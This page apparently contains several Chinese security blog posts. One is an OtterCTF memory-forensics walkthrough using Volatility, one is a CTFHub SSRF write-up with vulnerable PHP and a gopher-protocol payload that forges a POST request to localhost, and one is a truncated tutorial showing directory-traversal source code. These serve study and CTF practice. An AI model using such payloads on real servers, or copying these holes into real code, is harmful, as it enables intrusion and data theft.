+<h2 id="2-General-Info"><a href="#2-General-Info" class="headerlink" title="2-General Info"></a>2-General Info</h2><p>题目：电脑主机全称和IP地址是什么？</p>
+<p>通过网络连接查看ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=&quot;Win7SP1x64&quot; netscan</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003171518518.png" alt="image-20231003171518518"></p>
+<p>IP地址：192.168.202.131</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=&quot;Win7SP1x64&quot; printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003171816388.png" alt="image-20231003171816388"></p>
+<p>主机名：WIN-LO6FAF3DTFE，这是最直接的方法，还有一种就是，首先我们知道所有用户信息都会存储到注册表上，所以我们去查看注册表，找到注册表下的SYSTEM系统信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f  OtterCTF.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>
+
+<p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址(第一级)</p>
+<p><img src="/./../img/image-20231003185737061.png" alt="image-20231003185737061"></p>
+<p>第一级发现只是目录,而文件的位置使用偏移量来表示，0x开头，使用参数-o，printkey打印出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f  OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003185936033.png" alt="image-20231003185936033"></p>
+<p>继续深入下一层路径，\REGISTRY\MACHINE\SYSTEM\ControlSet001，-K是大K代表指定路径的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最后到”ControlSet001\Control\ComputerName\ComputerName”路径找到主机名</p>
+<h2 id="3-Play-Time"><a href="#3-Play-Time" class="headerlink" title="3-Play Time"></a>3-Play Time</h2><p>题目：瑞克只喜欢玩一些老式的电子游戏。你能看出他在玩什么游戏吗？服务器的ip地址是什么？</p>
+<p>查看进程，寻找那个游戏的身影</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003184645319.png" alt="image-20231003184645319"></p>
+<p>发现进程LunarMS.exe，pid&#x3D;708</p>
+<p><img src="/./../img/image-20231003195325365.png" alt="image-20231003195325365"></p>
+<p><img src="/./../img/image-20231003194853154.png" alt="image-20231003194853154"></p>
+<p>flag{LunarMS-77.102.199.102}</p>
+<h2 id="4-Name-Game1"><a href="#4-Name-Game1" class="headerlink" title="4-Name Game1"></a>4-Name Game1</h2><p>题目：我们知道账号登录到一个频道叫Lunar-3，这个账号名是？</p>
+<p>分析：听名字就知道和刚才那个lunar游戏有关，所以我们先提取一下LunarMS.exe这个进程，然后配合strings命令查找关键词Lunar-3，并匹配上下10行，寻找疑似账号.</p>
+<p>将进程提取出来，可以创个文件夹保存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D ./dump</span><br></pre></td></tr></table></figure>
+
+<p>memdump：提取进程，需要指定进程-p 和输出目录 -D</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./dump/708.dmp | grep -C 10 &quot;Lunar-3&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003200813332.png" alt="image-20231003200813332"></p>
+<p>linux<code> strings</code>命令：在对象文件或二进制文件中查找可打印的字符串</p>
+<p><code>grep</code>[选项] [模式] [文件名]</p>
+<p>这一个也可以<code>strings 708.dmp &gt; 708.dmp.strings</code>将708.dmp中的字符串输出到.strings文件中，然后<code>grep -C 10 “Lunar-3” ./dump708.dmp.strings</code>但是没有必要</p>
+<p>在线linux命令查询：<a target="_blank" rel="noopener" href="https://www.lzltool.com/LinuxCommand">https://www.lzltool.com/LinuxCommand</a></p>
+<p>flag{0tt3r8r33z3}</p>
+<h2 id="5-Name-Game2"><a href="#5-Name-Game2" class="headerlink" title="5-Name Game2"></a>5-Name Game2</h2><p>题目：通过一些研究，我们发现登录角色的用户名总是在这个签名之后：0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2}，Rick的角色名字是什么？</p>
+<p>分析：题目意思是16进制64后6-8位是16进制40 16进制06，再18位后是十六进制5a 十六进制0c 十六进制00。根据这个提示，我们可以将第四题dump下来的文件内容用grep进行筛选有十六进制5a 十六进制0c 十六进制00的片段，并往前进行确认，但这里需要用到kali自带的16进制查看器hexhump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C ./dump/708.dmp | grep &quot;5a 0c 00&quot; -A 3 -B 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003202031453.png" alt="image-20231003202031453"></p>
+<p>flag{M0rtyL0L}</p>
+<h2 id="6-Silly-Rick"><a href="#6-Silly-Rick" class="headerlink" title="6-Silly Rick"></a>6-Silly Rick</h2><p>题目:傻瑞克总是忘记电子邮件的密码，所以他使用在线存储密码服务来存储他的密码。他总是复制和粘贴密码，这样他就不会出错。瑞克的邮箱密码是什么？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003202519961.png" alt="image-20231003202519961"></p>
+<p>flag{M@il_Pr0vid0rs}</p>
+<h2 id="7-Hide-And-Seek"><a href="#7-Hide-And-Seek" class="headerlink" title="7-Hide And Seek"></a>7-Hide And Seek</h2><p>题目：我们提取了瑞克电脑内存镜像的原因是有一个恶意软件感染，请找到恶意软件的进程名称，包括恶意扩展名，为下一步分析加密密钥做准备。</p>
+<p>使用命令pstree查看进程树，最可疑的是PPID大于PID的进程。PID指进程号，操作系统里每打开一个程序都会创建一个进程ID，即PID。PID是各进程的代号，每个进程有唯一的PID编号，它是进程运行时系统分配的。PPID则代表当前进程的父进程ID。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003203114342.png" alt="image-20231003203114342"></p>
+<p>发现可疑进程vmware-tray.exe，而且发现Rick And Morty.exe就是它的父进程</p>
+<p>具体为什么他是恶意程序，我们进行深入挖掘一下,用dlllist命令打印每个进程加载的动态链接库列表，-p指向pid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003203802650.png" alt="image-20231003203802650"></p>
+<p>发现了他在Temp目录下运行，要知道Temp是windows下的临时文件夹，一般程序不会放在此文件夹中，放在此文件夹中的程序一般为恶意程序。</p>
+<p>也可以查看进程调用的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 cmdline -p 3820,3720</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003204410287.png" alt="image-20231003204410287"></p>
+<p>flag{vmware-tray.exe}</p>
+<h2 id="8-Path-To-Glory1"><a href="#8-Path-To-Glory1" class="headerlink" title="8-Path To Glory1"></a>8-Path To Glory1</h2><p>题目：恶意软件是怎么进入瑞克的电脑的？这一定是一种古老的违法习惯</p>
+<p>根据上面的命令调用，恶意软件是被下载下来的</p>
+<p>filescan：扫描所有文件列表,通过关键字Rick And Morty，查找可能与恶意软件进入电脑有关的文件，因为前言中说到rick用种子下载盗版电影、游戏。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 filescan | grep &#x27;Rick And Morty&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003205825806.png" alt="image-20231003205825806"></p>
+<p>有6个文件，3个种子文件和3个exe文件，先将种子文件分别dump下来，进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007dae9350 -D ./dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003210149931.png" alt="image-20231003210149931"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./dump/file.None.0xfffffa801b42c9e0.dat </span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003210501369.png" alt="image-20231003210501369"></p>
+<p>查看第二个种子文件时，发现website，说明是通过网站下载的</p>
+<p><img src="/./../img/image-20231003205251617.png" alt="image-20231003205251617"></p>
+<p>种子文件就是记载下载文件的存放位置、大小、下载服务器的地址、发布者的地址等数据的一个索引文件</p>
+<p>flag{M3an_T0rren7_4_R!cke}</p>
+<h2 id="9-Path-To-Glory2"><a href="#9-Path-To-Glory2" class="headerlink" title="9-Path To Glory2"></a>9-Path To Glory2</h2><p>题目：在恶意软件进入后继续搜索</p>
+<p>其实单看题目根本不知道要干什么，其实这题就是承接上一题，发现是从网站上下载的，自然想到浏览器，所以我们转存所有chrome的进程，然后使用strings命令配合grep命令查找Rick And Morty下载的相关数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -n chrome -D ./dump </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./dump/* | grep &#x27;Rick And Morty season 1 download.exe&#x27; -C 10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003212236116.png" alt="image-20231003212236116"></p>
+<p>感觉题目就是提示flag的位置，但是flag好像和具体题目没什么关系</p>
+<p>flag{Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear}</p>
+<h2 id="10-Bit-4-Bit"><a href="#10-Bit-4-Bit" class="headerlink" title="10-Bit 4 Bit"></a>10-Bit 4 Bit</h2><p>题目：我们已经发现这个恶意软件是一个勒索软件。查找攻击者的比特币地址(其实就是说请逆向并分析)</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D ./dump</span><br></pre></td></tr></table></figure>
+
+<p>procdump：进程转储成可执行文件</p>
+<p>直接搜索address，就可发现出flag</p>
+<p><img src="/./../img/image-20231003213854852.png" alt="image-20231003213854852"></p>
+<p>或者根据题目中的提示“ransomware”，就直接找出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -e l  OtterCTF.vmem | grep -i -A 5 &quot;ransomware&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231003214135080.png" alt="image-20231003214135080"></p>
+<p>flag{1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M}</p>
+<h2 id="11-Graphic’s-For-The-Weak"><a href="#11-Graphic’s-For-The-Weak" class="headerlink" title="11-Graphic’s For The Weak"></a>11-Graphic’s For The Weak</h2><p>题目：恶意软件的图形中有一些可疑之处</p>
+<p>foremost分离可执行文件，图片上就是flag</p>
+<p><img src="/./../img/image-20231003214517900.png" alt="image-20231003214517900"></p>
+<h2 id="12-Recovery"><a href="#12-Recovery" class="headerlink" title="12-Recovery"></a>12-Recovery</h2><p>题目：瑞克得把他的文件找回来！用来加密文件的随机密码是说明？</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/ssrf.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/ssrf.html" itemprop="url">ssrf</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-09-18T15:09:39+08:00">
+                2023-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="ssrf简介"><a href="#ssrf简介" class="headerlink" title="ssrf简介"></a>ssrf简介</h2><p>ssrf即服务器端请求伪造，利用服务器可以请求本地和内网中其他ip的权限，攻击者通过构造服务器请求，实现本地文件、信息获取和对内网中的ip进行端口扫描等。<br>漏洞成因：服务端提供了从其他服务器和本地获取数据的功能且没有对目标地址做过滤与限制，如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载</p>
+<h2 id="ssrf中常用伪协议"><a href="#ssrf中常用伪协议" class="headerlink" title="ssrf中常用伪协议"></a>ssrf中常用伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file://:访问本地文件系统</span><br><span class="line">http/s:探测内网主机存活</span><br><span class="line">dict:泄露安装软件版本信息，查看端口，操作内网redis服务</span><br><span class="line">Gopher:利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求</span><br></pre></td></tr></table></figure>
+
+<h2 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a>涉及函数</h2><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p> curl_exec函数用于执行指定的cURL会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); //设置为0表示禁用所有错误报告</span><br><span class="line">highlight_file(__FILE__);  //在浏览器中高亮显示当前脚本文件的源代码，__FILE__是一个魔术常量，表示当前脚本的文件名</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];  //初始化了一个CURL会话并将指定的URL作为参数传递给它</span><br><span class="line">$ch=curl_init($url); </span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);  //设置CURL会话的选项，将HEADER选项设置为0，表示不包括HTTP响应头部信息</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置CURL会话的选项，将RETURNTRANSFER选项设置为1，表示将抓取的内容作为字符串返回，而不是直接输出到浏览器。</span><br><span class="line">$result=curl_exec($ch);  //执行CURL会话，抓取指定URL的内容，并将结果存储在&quot;$result&quot;变量中</span><br><span class="line">curl_close($ch);  //关闭CURL会话，释放与之相关的资源</span><br><span class="line">echo ($result); //显示在用户的浏览器中</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>实现从指定的URL地址抓取内容并将其显示在浏览器中，相当于一个ssrf漏洞代码<br>利用：post传参<code>url=127.0.0.1/flag.php</code></p>
+<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p>打开一个网络连接或者一个Unix套接字连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$host=$_GET[&#x27;url&#x27;];</span><br><span class="line">$fp = fsockopen(&quot;$host&quot;,80, $errno, $errstr,30);</span><br><span class="line">if(!$fp)&#123;</span><br><span class="line">echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$out =&quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .=&quot;Host: $host\r\n&quot;;</span><br><span class="line">$out .=&quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">fwrite($fp, $out);</span><br><span class="line">while(!feof($fp))&#123;</span><br><span class="line">echo fgets($fp,1024);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限,传输原始数据</p>
+<h2 id="CTFHub-ssrf-POST请求"><a href="#CTFHub-ssrf-POST请求" class="headerlink" title="CTFHub-ssrf-POST请求"></a>CTFHub-ssrf-POST请求</h2><p>hint:这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年<br>curl:强大的开源库,支持多种协议，用来发送请求<br>御剑扫描php  200、3xx，探测到flag.php、index.php  &#x2F;&#x2F;扫不到<br><code>?url=127.0.0.1/flag.php</code>请求本地文件，右键源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=f27ff60682bab433bdd6eaf0d129d94f--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>发现key<br>?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();                               //初始化一次curl对话，ch返回curl句柄</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]); //curlopt_url需要获取的 URL 地址</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);             //启用时会将头文件的信息作为数据流输出。</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);     // 位掩码， 1 (301 永久重定向)</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">error_reporting(0);</span><br><span class="line"> </span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"> </span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;                                      #当post传值为key时使出flag</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>思路：往flag.php传key值就可以得到flag，而index.php可以利用curl传url，那么我们可以用gopher协议在index.php中构造post请求包往flag.php传key值，以此获取flag<br>POST包必须包含的四个参数：Content-Type,Content-Length,host,post<br>POST包如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36                //长度为key的长度</span><br><span class="line">key=ed200db79375f224af615ef4be4a006f</span><br></pre></td></tr></table></figure>
+<p>gopher的数据需要用url编码三次之后再发送<br><img src="/img/208.png"><br>第一次编码后的数据%0A替换%0D%0A，把替换后的数据进行第二次url编码，为什么要把%0A替换呢？回车换行，编码的时候忽略了LF（换行）<br>url在线：<a target="_blank" rel="noopener" href="http://www.jsons.cn/urlencode/">http://www.jsons.cn/urlencode/</a><br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Length%25253A%25252036%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250A%25250D%25250Akey%25253Ded200db79375f224af615ef4be4a006f</span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F;前面的http可加可不加<br>为什么不同的在线解码url结果不同<br>redis是什么<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Reme_mber/article/details/125581479">从一文中了解SSRF的各种绕过姿势及攻击思路</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/web%E6%BC%8F%E6%B4%9E.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/web%E6%BC%8F%E6%B4%9E.html" itemprop="url">web漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-08-20T21:32:04+08:00">
+                2023-08-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>漏洞源码1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>在dir_list.php文件中直接包含了soup文件夹下的文件，引发了目录遍历漏洞，通过此漏洞可能读取到网站根目录中的敏感文件（..&#x2F;)</p>
+<p>因为title&#x3D;soup&#x2F;jarheads.php传入的php文件是嵌套在html中的，所以会在界面中展示</p>
+<p>上面只是包含，加上这几行代码，查看源代码显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;soup/$filename&quot;;</span><br><span class="line">$handle = fopen ($filename,&quot;r&quot;) ;</span><br><span class="line">$contents = fread($handle,filesize($filename) ) ;</span><br><span class="line">echo $contents;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞源码2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function my_dir($dir) &#123;</span><br><span class="line">	$files = [];</span><br><span class="line">	if(@$handle = opendir($dir)) &#123;</span><br><span class="line">		while(($file = readdir($handle)) !== false) &#123;</span><br><span class="line">			if($file != &quot;..&quot; &amp;&amp; $file != &quot;.&quot;) &#123;</span><br><span class="line">				if(is_dir($dir . &quot;/&quot; . $file)) &#123; //如果是子文件夹，进行递归</span><br><span class="line">					$files[$file] = my_dir($dir . &quot;/&quot; . $file);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					$files[] = $file;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        closedir($handle);</span><br><span class="line">    &#125;</span><br><span class="line">	return 